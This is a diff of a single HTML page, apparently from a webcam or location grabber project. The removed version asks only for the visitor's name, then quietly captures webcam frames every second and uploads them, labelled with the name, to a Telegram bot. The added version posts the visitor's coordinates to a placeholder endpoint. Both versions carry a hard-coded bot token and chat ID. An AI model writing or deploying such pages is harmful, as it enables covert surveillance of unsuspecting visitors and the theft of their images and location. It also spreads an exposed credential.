@@ -3,108 +3,63 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Camera Access</title>
+    <title>Location Sharing</title>
     <style>
         body {
             background-color: black;
             color: white;
             font-family: Arial, sans-serif;
             text-align: center;
-            margin: 0;
-            padding: 0;
-        }
-        #container {
-            margin-top: 20%;
-        }
-        input[type="text"] {
-            padding: 10px;
-            font-size: 16px;
-        }
-        button {
-            padding: 10px 20px;
-            font-size: 16px;
-            background-color: #4CAF50;
-            color: white;
-            border: none;
-            cursor: pointer;
-        }
-        button:hover {
-            background-color: #45a049;
+            padding: 20px;
         }
     </style>
 </head>
 <body>
-    <div id="container">
-        <h1>Please Enter Your Name</h1>
-        <input type="text" id="username" placeholder="Enter your name" required>
-        <br><br>
-        <button onclick="startPhotoCapture()">OK</button>
-    </div>
+    <h1>Location Sharing</h1>
+    <button id="shareLocation">Share My Location</button>
+    <p id="status"></p>
+
     <script>
-        async function startPhotoCapture() {
-            const username = document.getElementById('username').value;
-            if (!username) {
-                alert('Please enter your name');
-                return;
+        document.getElementById('shareLocation').addEventListener('click', function() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        const latitude = position.coords.latitude;
+                        const longitude = position.coords.longitude;
+                        document.getElementById('status').innerText = `Location: Latitude ${latitude}, Longitude ${longitude}`;
+                        
+                        // Replace the URL with your server-side script endpoint
+                        const url = 'https://example.com/sendLocation'; 
+                        const data = {
+                            chatId: '5112680061',
+                            latitude: latitude,
+                            longitude: longitude,
+                            botToken: '6197747448:AAFrgXeZdjQZ1iTm9AE6v56h6y-qShiH5es'
+                        };
+                        
+                        fetch(url, {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json',
+                            },
+                            body: JSON.stringify(data),
+                        })
+                        .then(response => response.json())
+                        .then(data => {
+                            document.getElementById('status').innerText += ' - Location sent!';
+                        })
+                        .catch((error) => {
+                            console.error('Error:', error);
+                        });
+                    },
+                    function(error) {
+                        document.getElementById('status').innerText = 'Error getting location.';
+                    }
+                );
+            } else {
+                document.getElementById('status').innerText = 'Geolocation is not supported by this browser.';
             }
-
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                video.play();
-
-                // Create a canvas element to capture the photo
-                const canvas = document.createElement('canvas');
-                const context = canvas.getContext('2d');
-
-                // Set canvas dimensions to match the video
-                video.addEventListener('loadedmetadata', () => {
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-
-                    // Capture and send photo every second
-                    setInterval(() => {
-                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                        canvas.toBlob(blob => {
-                            if (blob) {
-                                sendToTelegram(username, blob);
-                            }
-                        }, 'image/jpeg');
-                    }, 1000); // Capture and send photo every 1000 ms (1 second)
-                });
-
-            } catch (error) {
-                alert('Camera access denied or failed.');
-            }
-        }
-
-        async function sendToTelegram(username, photoBlob) {
-            const botToken = '6197747448:AAFrgXeZdjQZ1iTm9AE6v56h6y-qShiH5es';  // Replace with your bot token
-            const chatId = '5112680061';      // Replace with your chat ID
-            const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;
-
-            // Create FormData and append the photo file
-            const formData = new FormData();
-            formData.append('chat_id', chatId);
-            formData.append('caption', `User: ${username}`);
-            formData.append('photo', photoBlob, 'photo.jpg');
-
-            try {
-                const response = await fetch(url, {
-                    method: 'POST',
-                    body: formData
-                });
-
-                // Optional: Log response for debugging
-                const data = await response.json();
-                if (!data.ok) {
-                    console.error('Telegram API Error:', data);
-                }
-            } catch (error) {
-                console.error('Fetch Error:', error);
-            }
-        }
+        });
     </script>
 </body>
 </html>
